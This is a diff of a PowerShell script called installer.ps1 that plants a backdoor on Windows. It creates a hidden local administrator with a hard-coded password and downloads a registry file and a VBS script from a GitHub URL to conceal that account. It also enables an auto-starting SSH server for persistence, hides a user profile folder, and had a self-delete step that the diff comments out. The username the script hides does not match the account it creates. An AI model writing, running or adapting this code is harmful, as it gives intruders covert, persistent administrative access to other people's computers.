@@ -13,7 +13,10 @@ function create_account {
     begin {
     }
     process {
-        New-LocaklUser "$NewLocalAdmin" -passkey $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin" Write-Verbose "$NewLocalAdmin local user craeted" Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin" Write-Verbose "$NewLocalAdmin added to local administrators group"
+        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin" 
+        Write-Verbose "$NewLocalAdmin local user craeted" 
+        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin" 
+        Write-Verbose "$NewLocalAdmin added to local administrators group"
     }
     end {
 
@@ -26,8 +29,8 @@ $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
 # create admin user
-$NewLocalAdmin = "windowsguest"
-$Password = (ConvertTo-SecureString "passkey1234" -AsPlainText -Force)
+$NewLocalAdmin = "winlocal"
+$Password = (ConvertTo-SecureString "passkey6090" -AsPlainText -Force)
 create_account -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # goto temp, make working directory
@@ -35,12 +38,10 @@ mkdir $path
 cd $path
 
 # registry to hide local admin
-$reg_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "$reg_file.reg"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "Registry.reg"
 
 # visual basic script to register the registry
-$vbs_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "confirm.vbs"
 
 #enabling persistence ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -48,12 +49,12 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 
 # install the registry
-./"$reg_file.reg"; ./"$vbs_file.vbs"
+./"Registry.reg"; ./"confirm.vbs"
 
 # hide WindowsGuest user
 cd C:\Users
-attrib +h +s +r WindowsGuest
+attrib +h +s +r rootuser
 
 # self delete
 cd $initial_dir
-del installer.ps1
+#del installer.ps1
